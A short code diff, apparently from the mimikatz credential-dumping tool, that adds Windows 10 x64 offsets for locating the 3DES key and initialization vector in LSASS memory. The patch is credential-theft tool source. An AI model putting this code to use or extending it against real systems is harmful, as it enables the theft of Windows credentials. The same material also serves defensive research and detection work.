@@ -17,6 +17,8 @@ BYTE PTRN_WIN8_LsaInitializeProtectedMemory_KEY[]	= {0x83, 0x64, 0x24, 0x30, 0x0
 LONG OFFS_WIN8_hAesKey								= 23;
 LONG OFFS_WIN8_h3DesKey								= -70;
 LONG OFFS_WIN8_InitializationVector					= 62;
+LONG OFFS_WI10_h3DesKey								= -66;
+LONG OFFS_WI10_InitializationVector					= 58;
 #elif defined _M_IX86
 BYTE PTRN_WNO8_LsaInitializeProtectedMemory_KEY[]	= {0x8b, 0xf0, 0x3b, 0xf3, 0x7c, 0x2c, 0x6a, 0x02, 0x6a, 0x10, 0x68};
 LONG OFFS_WNO8_hAesKey								= -15;
@@ -210,6 +212,12 @@ NTSTATUS kuhl_m_sekurlsa_nt6_acquireKeys(PKUHL_M_SEKURLSA_CONTEXT cLsass, PKULL_
 		{
 			PTRN_WNT6_LsaInitializeProtectedMemory_KEY = PTRN_WIN81_LsaInitializeProtectedMemory_KEY;
 			SIZE_PTRN_WNT6_LsaInitializeProtectedMemory_KEY = sizeof(PTRN_WIN81_LsaInitializeProtectedMemory_KEY);
+		}
+#elif defined _M_X64
+		if(cLsass->osContext.MinorVersion > 3)
+		{	
+			OFFS_WNT6_h3DesKey = OFFS_WI10_h3DesKey;
+			OFFS_WNT6_InitializationVector = OFFS_WI10_InitializationVector;
 		}
 #endif
 	}
